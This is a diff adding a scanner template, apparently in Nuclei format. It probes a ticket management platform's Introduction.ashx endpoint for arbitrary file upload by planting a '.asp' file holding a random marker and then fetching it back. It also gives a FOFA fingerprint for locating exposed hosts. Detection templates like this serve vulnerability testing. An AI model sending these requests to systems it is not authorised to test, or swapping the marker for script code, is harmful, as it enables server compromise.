@@ -1,0 +1,76 @@
+id: poc-yaml-zckx-introduction-ashx-anyfile-upload
+
+info:
+  name: Introduction.ashx Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  metadata:
+    fingerprint: Ticket Management Platform
+    fofa: body="SystemManager/SoftwareLicense.htm"
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload-check
+    raw:
+      - |
+        POST /SystemManager/Introduction.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
+
+        ----------------------------354575237365372692397370
+        Content-Disposition: form-data; name="file"; filename="1.txt"
+        Content-Type: image/jpeg
+
+        {{t2}}
+        ----------------------------354575237365372692397370
+        Content-Disposition: form-data; name="fileName"
+
+        1.asp
+        ----------------------------354575237365372692397370
+        Content-Disposition: form-data; name="Method"
+
+        UpdateUploadLinkPic
+        ----------------------------354575237365372692397370
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "UploadImage"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        group: 1
+        regex:
+          - "([0-9a-zA-Z_]+)\\.asp"
+
+  - id: file-verification
+    raw:
+      - |
+        GET /UploadImage/{{file}}.asp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
